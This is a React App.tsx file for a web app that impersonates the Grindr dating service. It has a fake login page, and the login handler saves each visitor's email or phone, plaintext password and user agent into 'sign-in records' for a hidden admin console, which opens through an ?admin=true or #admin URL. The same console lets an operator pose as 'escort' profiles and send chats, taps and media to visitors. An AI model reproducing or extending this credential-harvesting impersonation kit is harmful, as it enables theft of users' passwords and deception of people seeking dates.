/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { LandingPage } from './components/LandingPage';
import { GrindrWebClient } from './components/GrindrWebClient';
import { LoginFormPage } from './components/LoginFormPage';
import { ProfileModal } from './components/ProfileModal';
import { GetAppModal } from './components/GetAppModal';
import { UnlimitedModal } from './components/UnlimitedModal';
import { InfoModal, InfoModalType } from './components/InfoModal';
import { FilterModal } from './components/FilterModal';
import { MyProfileModal, MyProfileData } from './components/MyProfileModal';
import { AdminChatConsole } from './components/AdminChatConsole';
import { Profile, ChatMessage, Conversation, FilterState, TapType, ProfileReport, SignInRecord } from './types';
import { INITIAL_PROFILES, INITIAL_CONVERSATIONS } from './data/mockProfiles';
import { broadcastChatEvent, subscribeToChatEvents } from './utils/chatSync';

const DEFAULT_FILTERS: FilterState = {
  onlineOnly: false,
  photosOnly: false,
  maxDistanceKm: 25,
  minAge: 18,
  maxAge: 50,
  selectedTribes: [],
  selectedLookingFor: [],
};

const DEFAULT_MY_PROFILE: MyProfileData = {
  name: 'Alex',
  age: 28,
  headline: 'Espresso fanatic & spontaneous explorer ☕✨',
  bio: 'Love architecture, late night drives, indie concerts, and trying new cocktail lounges. Say hi!',
  lookingFor: ['Dates', 'Friends', 'Chat'],
  tribes: ['Clean-Cut'],
  showDistance: true,
  incognito: false,
};

// Deduplicate profiles to ensure 100% unique profile names and unique profile images
const deduplicateProfiles = (list: Profile[]): Profile[] => {
  const seenIds = new Set<string>();
  const seenNames = new Set<string>();
  const seenImages = new Set<string>();
  const deduped: Profile[] = [];

  for (const item of list) {
    if (!item) continue;
    const nameKey = item.name.trim().toLowerCase();
    const imageKey = item.image;
    if (seenIds.has(item.id) || seenNames.has(nameKey) || seenImages.has(imageKey)) {
      continue;
    }
    seenIds.add(item.id);
    seenNames.add(nameKey);
    seenImages.add(imageKey);
    deduped.push(item);
  }
  return deduped;
};

const getSafeConversation = (
  conv: Conversation | undefined,
  profileId: string,
  fallbackMsg?: ChatMessage
): Conversation => {
  return {
    profileId,
    unreadCount: conv?.unreadCount || 0,
    lastMessage: conv?.lastMessage || fallbackMsg || { id: '0', senderId: 'me', text: '', timestamp: '', read: true },
    messages: Array.isArray(conv?.messages) ? conv.messages : [],
  };
};

export default function App() {
  const [viewMode, setViewMode] = useState<'landing' | 'login' | 'web'>(() => {
    try {
      const saved = localStorage.getItem('grindr_view_mode_v2');
      if (saved === 'web' || saved === 'login' || saved === 'landing') return saved;
    } catch (e) { /* ignore */ }
    return 'landing';
  });

  useEffect(() => {
    try {
      localStorage.setItem('grindr_view_mode_v2', viewMode);
    } catch (e) { /* ignore */ }
  }, [viewMode]);

  const [profiles, setProfiles] = useState<Profile[]>(() => {
    try {
      localStorage.removeItem('grindr_profiles');
      localStorage.removeItem('grindr_profiles_v2');
      localStorage.removeItem('grindr_profiles_v3');
      localStorage.removeItem('grindr_profiles_v4');
      localStorage.removeItem('grindr_profiles_v5');
    } catch (e) { /* ignore */ }
    return deduplicateProfiles(INITIAL_PROFILES);
  });

  const [conversations, setConversations] = useState<Record<string, Conversation>>(() => {
    let base = INITIAL_CONVERSATIONS;
    try {
      const saved = localStorage.getItem('grindr_conversations');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (parsed && typeof parsed === 'object') {
          base = { ...INITIAL_CONVERSATIONS, ...parsed };
        }
      }
    } catch (e) { /* ignore */ }

    // Sanitize every conversation to ensure messages is always an array
    const sanitized: Record<string, Conversation> = {};
    for (const [key, conv] of Object.entries(base)) {
      if (conv && typeof conv === 'object') {
        sanitized[key] = {
          ...conv,
          profileId: conv.profileId || key,
          unreadCount: conv.unreadCount || 0,
          lastMessage: conv.lastMessage || { id: '0', senderId: 'me', text: '', timestamp: '', read: true },
          messages: Array.isArray(conv.messages) ? conv.messages : [],
        };
      }
    }
    return sanitized;
  });

  const [filters, setFilters] = useState<FilterState>(DEFAULT_FILTERS);
  const [myProfile, setMyProfile] = useState<MyProfileData>(() => {
    const saved = localStorage.getItem('grindr_my_profile');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* ignore */ }
    }
    return DEFAULT_MY_PROFILE;
  });

  // Modal States
  const [activeProfileModal, setActiveProfileModal] = useState<Profile | null>(null);
  const [activeChatProfile, setActiveChatProfile] = useState<Profile | null>(null);
  const [webInitialTab, setWebInitialTab] = useState<'grid' | 'messages' | 'favorites' | 'profile'>('grid');
  const [isGetAppOpen, setIsGetAppOpen] = useState(false);
  const [isUnlimitedOpen, setIsUnlimitedOpen] = useState(false);
  const [infoModalType, setInfoModalType] = useState<InfoModalType | null>(null);
  const [isFilterModalOpen, setIsFilterModalOpen] = useState(false);
  const [isMyProfileModalOpen, setIsMyProfileModalOpen] = useState(false);
  const [isAdminConsoleOpen, setIsAdminConsoleOpen] = useState(() => {
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search);
      if (
        params.get('admin') === 'true' ||
        params.get('admin') === '1' ||
        params.get('portal') === 'admin' ||
        window.location.hash === '#admin'
      ) {
        return true;
      }
    }
    return false;
  });

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const handleHashOrQuery = () => {
        const params = new URLSearchParams(window.location.search);
        if (
          params.get('admin') === 'true' ||
          params.get('admin') === '1' ||
          params.get('portal') === 'admin' ||
          window.location.hash === '#admin'
        ) {
          setIsAdminConsoleOpen(true);
        }
      };
      window.addEventListener('hashchange', handleHashOrQuery);
      return () => window.removeEventListener('hashchange', handleHashOrQuery);
    }
  }, []);

  const [blockedProfileIds, setBlockedProfileIds] = useState<string[]>(() => {
    const saved = localStorage.getItem('grindr_blocked_profiles');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* ignore */ }
    }
    return [];
  });

  // Sync state to localStorage
  useEffect(() => {
    localStorage.setItem('grindr_profiles_v5', JSON.stringify(profiles));
  }, [profiles]);

  // Ensure canonical profile updates from INITIAL_PROFILES sync immediately
  useEffect(() => {
    setProfiles(() => deduplicateProfiles(INITIAL_PROFILES));
  }, []);

  useEffect(() => {
    localStorage.setItem('grindr_conversations', JSON.stringify(conversations));
  }, [conversations]);

  useEffect(() => {
    localStorage.setItem('grindr_my_profile', JSON.stringify(myProfile));
  }, [myProfile]);

  useEffect(() => {
    localStorage.setItem('grindr_blocked_profiles', JSON.stringify(blockedProfileIds));
  }, [blockedProfileIds]);

  // Keep active profile modal updated if profile image or data updates
  useEffect(() => {
    if (activeProfileModal) {
      const match = profiles.find((p) => p.id === activeProfileModal.id);
      if (
        match &&
        (match.image !== activeProfileModal.image ||
          match.age !== activeProfileModal.age ||
          match.hasAudioNote !== activeProfileModal.hasAudioNote ||
          JSON.stringify(match.social) !== JSON.stringify(activeProfileModal.social) ||
          match.videoUrl !== activeProfileModal.videoUrl ||
          JSON.stringify(match.album) !== JSON.stringify(activeProfileModal.album))
      ) {
        setActiveProfileModal(match);
      }
    }
  }, [profiles, activeProfileModal]);

  const handleBlockProfile = (profileId: string) => {
    setBlockedProfileIds((prev) => [...prev, profileId]);
    setActiveChatProfile(null);
  };

  const [reports, setReports] = useState<ProfileReport[]>(() => {
    const saved = localStorage.getItem('grindr_profile_reports');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* ignore */ }
    }
    return [];
  });

  useEffect(() => {
    localStorage.setItem('grindr_profile_reports', JSON.stringify(reports));
  }, [reports]);

  const handleReportProfile = (profileId: string, reason: string, details?: string, autoBlock?: boolean) => {
    const target = profiles.find((p) => p.id === profileId);
    const newReport: ProfileReport = {
      id: `rep-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      profileId,
      profileName: target?.name || 'User',
      reason,
      details,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      status: 'pending',
    };
    setReports((prev) => [newReport, ...prev]);

    if (autoBlock) {
      handleBlockProfile(profileId);
    }
  };

  const handleResolveReport = (reportId: string) => {
    setReports((prev) =>
      prev.map((r) => (r.id === reportId ? { ...r, status: 'resolved' } : r))
    );
  };

  // Sign-in information captured and saved in admin backend
  const [signInRecords, setSignInRecords] = useState<SignInRecord[]>(() => {
    const saved = localStorage.getItem('grindr_admin_signin_records');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* ignore */ }
    }
    return [
      {
        id: 'rec-init-01',
        name: 'Alex',
        emailOrPhone: 'alex.demo@web.app',
        authMethod: 'email',
        password: 'Password123!',
        rememberMe: true,
        timestamp: '10:45 AM',
        dateFormatted: 'Today',
        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0',
        status: 'active',
      },
    ];
  });

  useEffect(() => {
    localStorage.setItem('grindr_admin_signin_records', JSON.stringify(signInRecords));
  }, [signInRecords]);

  const handleDeleteSignInRecord = (id: string) => {
    setSignInRecords((prev) => prev.filter((r) => r.id !== id));
  };

  const handleClearSignInRecords = () => {
    setSignInRecords([]);
  };


  // Subscribe to real-time cross-tab / cross-window live chat events
  useEffect(() => {
    const unsubscribe = subscribeToChatEvents((event) => {
      if (event.type === 'NEW_MESSAGE' && event.message && event.profileId) {
        const msg = event.message;
        const pid = event.profileId;
        setConversations((prev) => {
          const currentConv = getSafeConversation(prev[pid], pid, msg);
          // Guard against duplicate messages
          if (currentConv.messages.some((m) => m.id === msg.id)) {
            return prev;
          }
          return {
            ...prev,
            [pid]: {
              ...currentConv,
              lastMessage: msg,
              unreadCount: activeChatProfile?.id === pid ? 0 : currentConv.unreadCount + 1,
              messages: [...currentConv.messages, msg],
            },
          };
        });
      } else if (event.type === 'MEDIA_EXPIRED' && event.messageId) {
        const mid = event.messageId;
        setConversations((prev) => {
          const updated = { ...prev };
          for (const [profId, conv] of Object.entries(updated)) {
            if (!conv) continue;
            const msgList = Array.isArray(conv.messages) ? conv.messages : [];
            const idx = msgList.findIndex((m) => m.id === mid);
            if (idx !== -1) {
              const updatedMessages = [...msgList];
              updatedMessages[idx] = { ...updatedMessages[idx], isExpired: true };
              updated[profId] = { ...conv, messages: updatedMessages };
            }
          }
          return updated;
        });
      } else if (event.type === 'TYPING' && event.profileId) {
        const pid = event.profileId;
        setIsTyping((prev) => ({
          ...prev,
          [pid]: !!event.isTyping,
        }));
      } else if (event.type === 'SIGN_IN' && event.signInRecord) {
        const record = event.signInRecord;
        setSignInRecords((prev) => {
          if (prev.some((r) => r.id === record.id)) return prev;
          return [record, ...prev];
        });
      }
    });

    return () => {
      unsubscribe();
    };
  }, [activeChatProfile]);

  const [isTyping, setIsTyping] = useState<Record<string, boolean>>({});

  // Handle Favorites toggle
  const handleToggleFavorite = (profileId: string) => {
    setProfiles((prev) =>
      prev.map((p) => (p.id === profileId ? { ...p, isFavorite: !p.isFavorite } : p))
    );
    if (activeProfileModal && activeProfileModal.id === profileId) {
      setActiveProfileModal((prev) => prev ? { ...prev, isFavorite: !prev.isFavorite } : null);
    }
  };

  // Start chat with a profile
  const handleStartChat = (profile: Profile) => {
    setActiveProfileModal(null);
    setActiveChatProfile(profile);
    setWebInitialTab('messages');
    if (viewMode !== 'web') {
      setViewMode('web');
    }
    // Mark messages as read
    setConversations((prev) => {
      const existing = prev[profile.id];
      if (!existing) return prev;
      return {
        ...prev,
        [profile.id]: {
          ...existing,
          unreadCount: 0,
          messages: Array.isArray(existing.messages) ? existing.messages : [],
        },
      };
    });
  };

  // Open direct private chat suite
  const handleOpenPrivateChat = (profile?: Profile) => {
    const target = profile || profiles.find((p) => p.id === 'derek-muscular') || profiles[0];
    if (target) {
      setActiveChatProfile(target);
    }
    setWebInitialTab('messages');
    setViewMode('web');
  };

  // Send a message (supporting bilateral sending, photos, videos, expiring media with zero bot AI suggestions)
  const handleSendMessage = (profileId: string, text: string, options?: Partial<ChatMessage>) => {
    const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const isPartner = options?.senderId && options.senderId !== 'me';
    const newMsg: ChatMessage = {
      id: `msg-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      senderId: isPartner ? profileId : 'me',
      text,
      timestamp: timeNow,
      read: true,
      ...options,
    };

    setConversations((prev) => {
      const currentConv = getSafeConversation(prev[profileId], profileId, newMsg);
      return {
        ...prev,
        [profileId]: {
          ...currentConv,
          unreadCount: 0,
          lastMessage: newMsg,
          messages: [...currentConv.messages, newMsg],
        },
      };
    });

    // Broadcast in real-time to other browser tabs/windows (cross-window sync)
    broadcastChatEvent({
      type: 'NEW_MESSAGE',
      profileId,
      senderRole: isPartner ? 'escort' : 'visitor',
      message: newMsg,
    });
  };

  // Send a Tap
  const handleSendTap = (profile: Profile, tap: TapType, asPartner?: boolean) => {
    const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const tapMsg: ChatMessage = {
      id: `tap-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      senderId: asPartner ? profile.id : 'me',
      tapType: tap,
      timestamp: timeNow,
      read: true,
    };

    setConversations((prev) => {
      const currentConv = getSafeConversation(prev[profile.id], profile.id, tapMsg);
      return {
        ...prev,
        [profile.id]: {
          ...currentConv,
          lastMessage: tapMsg,
          messages: [...currentConv.messages, tapMsg],
        },
      };
    });

    broadcastChatEvent({
      type: 'NEW_MESSAGE',
      profileId: profile.id,
      senderRole: asPartner ? 'escort' : 'visitor',
      message: tapMsg,
    });
  };

  // Send expiring photo
  const handleSendExpiringPhoto = (profileId: string, asPartner?: boolean) => {
    const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const recipient = profiles.find((p) => p.id === profileId);
    const expMsg: ChatMessage = {
      id: `exp-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      senderId: asPartner ? profileId : 'me',
      mediaType: 'image',
      imageUrl: recipient?.image || 'https://images.unsplash.com/photo-1583454110551-21f2fa2afe61?w=800&auto=format&fit=crop&q=80',
      isExpiring: true,
      viewOnceSeconds: 10,
      timestamp: timeNow,
      read: true,
    };

    setConversations((prev) => {
      const currentConv = getSafeConversation(prev[profileId], profileId, expMsg);
      return {
        ...prev,
        [profileId]: {
          ...currentConv,
          lastMessage: expMsg,
          messages: [...currentConv.messages, expMsg],
        },
      };
    });

    broadcastChatEvent({
      type: 'NEW_MESSAGE',
      profileId,
      senderRole: asPartner ? 'escort' : 'visitor',
      message: expMsg,
    });
  };

  // Send location pin
  const handleSendLocation = (profileId: string, asPartner?: boolean) => {
    const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const locMsg: ChatMessage = {
      id: `loc-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      senderId: asPartner ? profileId : 'me',
      isLocation: true,
      locationName: 'Nearby Location',
      timestamp: timeNow,
      read: true,
    };

    setConversations((prev) => {
      const currentConv = getSafeConversation(prev[profileId], profileId, locMsg);
      return {
        ...prev,
        [profileId]: {
          ...currentConv,
          lastMessage: locMsg,
          messages: [...currentConv.messages, locMsg],
        },
      };
    });

    broadcastChatEvent({
      type: 'NEW_MESSAGE',
      profileId,
      senderRole: asPartner ? 'escort' : 'visitor',
      message: locMsg,
    });
  };

  // Expire view-once message once viewed
  const handleExpireMessage = (messageId: string) => {
    setConversations((prev) => {
      const updated = { ...prev };
      for (const [profId, rawConv] of Object.entries(updated)) {
        const conv = getSafeConversation(rawConv, profId);
        const msgIdx = conv.messages.findIndex((m) => m.id === messageId);
        if (msgIdx !== -1) {
          const updatedMessages = [...conv.messages];
          updatedMessages[msgIdx] = {
            ...updatedMessages[msgIdx],
            isExpired: true,
          };
          updated[profId] = {
            ...conv,
            messages: updatedMessages,
          };
        }
      }
      return updated;
    });

    broadcastChatEvent({
      type: 'MEDIA_EXPIRED',
      profileId: activeChatProfile?.id || '',
      senderRole: 'visitor',
      messageId,
    });
  };

  // Admin / Escort response handlers (Replying on behalf of the escort)
  const handleSendMessageAsEscort = (profileId: string, text: string, options?: Partial<ChatMessage>) => {
    const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const escortMsg: ChatMessage = {
      id: `msg-escort-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      senderId: profileId,
      text,
      timestamp: timeNow,
      read: true,
      ...options,
    };

    setConversations((prev) => {
      const currentConv = getSafeConversation(prev[profileId], profileId, escortMsg);
      return {
        ...prev,
        [profileId]: {
          ...currentConv,
          lastMessage: escortMsg,
          messages: [...currentConv.messages, escortMsg],
        },
      };
    });

    broadcastChatEvent({
      type: 'NEW_MESSAGE',
      profileId,
      senderRole: 'escort',
      message: escortMsg,
    });
  };

  const handleSendTapAsEscort = (profile: Profile, tap: TapType) => {
    const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const tapMsg: ChatMessage = {
      id: `tap-escort-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      senderId: profile.id,
      tapType: tap,
      timestamp: timeNow,
      read: true,
    };

    setConversations((prev) => {
      const currentConv = getSafeConversation(prev[profile.id], profile.id, tapMsg);
      return {
        ...prev,
        [profile.id]: {
          ...currentConv,
          lastMessage: tapMsg,
          messages: [...currentConv.messages, tapMsg],
        },
      };
    });

    broadcastChatEvent({
      type: 'NEW_MESSAGE',
      profileId: profile.id,
      senderRole: 'escort',
      message: tapMsg,
    });
  };

  const handleSendMediaAsEscort = (
    profileId: string,
    mediaType: 'image' | 'video',
    url: string,
    isExpiring?: boolean,
    caption?: string
  ) => {
    const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const mediaMsg: ChatMessage = {
      id: `media-escort-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      senderId: profileId,
      mediaType,
      imageUrl: mediaType === 'image' ? url : undefined,
      videoUrl: mediaType === 'video' ? url : undefined,
      videoDuration: mediaType === 'video' ? '0:12' : undefined,
      isExpiring,
      viewOnceSeconds: isExpiring ? 10 : undefined,
      text: caption,
      timestamp: timeNow,
      read: true,
    };

    setConversations((prev) => {
      const currentConv = getSafeConversation(prev[profileId], profileId, mediaMsg);
      return {
        ...prev,
        [profileId]: {
          ...currentConv,
          lastMessage: mediaMsg,
          messages: [...currentConv.messages, mediaMsg],
        },
      };
    });

    broadcastChatEvent({
      type: 'NEW_MESSAGE',
      profileId,
      senderRole: 'escort',
      message: mediaMsg,
    });
  };

  const handleLoginSuccess = (userData: {
    name: string;
    emailOrPhone: string;
    password?: string;
    authMethod: 'email' | 'phone';
    rememberMe?: boolean;
    locationCity?: string;
    coords?: { lat: number; lng: number };
  }) => {
    if (userData.name) {
      setMyProfile((prev) => ({
        ...prev,
        name: userData.name,
      }));
    }

    const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const dateNow = new Date().toLocaleDateString([], { month: 'short', day: 'numeric', year: 'numeric' });
    const newRecord: SignInRecord = {
      id: `signin-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      name: userData.name || 'Visitor',
      emailOrPhone: userData.emailOrPhone,
      authMethod: userData.authMethod || (userData.emailOrPhone.includes('@') ? 'email' : 'phone'),
      password: userData.password,
      rememberMe: userData.rememberMe,
      timestamp: timeNow,
      dateFormatted: dateNow,
      userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : undefined,
      status: 'active',
    };

    setSignInRecords((prev) => [newRecord, ...prev]);

    // Broadcast in real-time to other browser tabs/windows (cross-window sync)
    broadcastChatEvent({
      type: 'SIGN_IN',
      signInRecord: newRecord,
    });

    setViewMode('web');
  };

  return (
    <div className="min-h-screen bg-[#0b0b0c] text-white">
      {/* Either Landing page view, Login form page, or Grindr Web client view */}
      {viewMode === 'landing' ? (
        <LandingPage
          profiles={profiles}
          onSelectProfile={(p) => setActiveProfileModal(p)}
          onOpenWebClient={() => setViewMode('login')}
          onOpenPrivateChat={handleOpenPrivateChat}
          onOpenGetApp={() => setIsGetAppOpen(true)}
          onOpenUnlimited={() => setIsUnlimitedOpen(true)}
          onOpenInfo={(type) => setInfoModalType(type)}
          onOpenBackendAccess={() => setIsAdminConsoleOpen(true)}
        />
      ) : viewMode === 'login' ? (
        <LoginFormPage
          onLoginSuccess={handleLoginSuccess}
          onBackToHome={() => setViewMode('landing')}
        />
      ) : (
        <GrindrWebClient
          profiles={profiles.filter((p) => !blockedProfileIds.includes(p.id))}
          conversations={Object.fromEntries(
            Object.entries(conversations).filter(([id]) => !blockedProfileIds.includes(id))
          )}
          filters={filters}
          myProfile={myProfile}
          activeProfile={activeProfileModal}
          activeChatProfile={activeChatProfile}
          initialTab={webInitialTab}
          onSelectProfile={(p) => setActiveProfileModal(p)}
          onOpenChat={(p) => setActiveChatProfile(p)}
          onCloseChat={() => setActiveChatProfile(null)}
          onSendMessage={handleSendMessage}
          onSendTap={handleSendTap}
          onSendExpiringPhoto={handleSendExpiringPhoto}
          onSendLocation={handleSendLocation}
          onExpireMessage={handleExpireMessage}
          onToggleFavorite={handleToggleFavorite}
          onOpenFilters={() => setIsFilterModalOpen(true)}
          onOpenUnlimited={() => setIsUnlimitedOpen(true)}
          onOpenMyProfile={() => setIsMyProfileModalOpen(true)}
          onExitToLanding={() => setViewMode('landing')}
          onOpenBackendAccess={() => setIsAdminConsoleOpen(true)}
          isTyping={isTyping}
          onMarkConversationAsRead={(id) => {
            setConversations((prev) => {
              if (!prev[id]) return prev;
              return {
                ...prev,
                [id]: {
                  ...prev[id],
                  unreadCount: 0,
                  messages: Array.isArray(prev[id].messages) ? prev[id].messages : [],
                },
              };
            });
          }}
        />
      )}

      {/* Profile Detail Modal */}
      {activeProfileModal && (
        <ProfileModal
          profile={activeProfileModal}
          onClose={() => setActiveProfileModal(null)}
          onStartChat={handleStartChat}
          onSendTap={handleSendTap}
          onToggleFavorite={handleToggleFavorite}
          onBlockProfile={handleBlockProfile}
          onReportProfile={handleReportProfile}
        />
      )}

      {/* Get the App Modal */}
      {isGetAppOpen && (
        <GetAppModal
          onClose={() => setIsGetAppOpen(false)}
          onOpenWeb={() => {
            setIsGetAppOpen(false);
            setViewMode('login');
          }}
        />
      )}

      {/* Unlimited Subscription Modal */}
      {isUnlimitedOpen && (
        <UnlimitedModal
          onClose={() => setIsUnlimitedOpen(false)}
        />
      )}

      {/* Info & Legal Modal */}
      {infoModalType && (
        <InfoModal
          type={infoModalType}
          onClose={() => setInfoModalType(null)}
        />
      )}

      {/* Filter Radar Modal */}
      {isFilterModalOpen && (
        <FilterModal
          filters={filters}
          onChange={(newFilters) => setFilters(newFilters)}
          onReset={() => setFilters(DEFAULT_FILTERS)}
          onClose={() => setIsFilterModalOpen(false)}
        />
      )}

      {/* My Profile Editor Modal */}
      {isMyProfileModalOpen && (
        <MyProfileModal
          myProfile={myProfile}
          onSave={(updated) => setMyProfile(updated)}
          onClose={() => setIsMyProfileModalOpen(false)}
        />
      )}

      {/* Backend Access / Admin Operator Desk Modal */}
      {isAdminConsoleOpen && (
        <AdminChatConsole
          profiles={profiles}
          conversations={conversations}
          reports={reports}
          onResolveReport={handleResolveReport}
          signInRecords={signInRecords}
          onDeleteSignInRecord={handleDeleteSignInRecord}
          onClearSignInRecords={handleClearSignInRecords}
          onSendMessageAsEscort={handleSendMessageAsEscort}
          onSendTapAsEscort={handleSendTapAsEscort}
          onSendMediaAsEscort={handleSendMediaAsEscort}
          onMarkConversationAsRead={(id) => {
            setConversations((prev) => {
              if (!prev[id]) return prev;
              return {
                ...prev,
                [id]: {
                  ...prev[id],
                  unreadCount: 0,
                  messages: Array.isArray(prev[id].messages) ? prev[id].messages : [],
                },
              };
            });
          }}
          onClose={() => setIsAdminConsoleOpen(false)}
          onSwitchToVisitorView={(targetProfile) => {
            setIsAdminConsoleOpen(false);
            if (targetProfile) {
              handleStartChat(targetProfile);
            }
          }}
        />
      )}
    </div>
  );
}
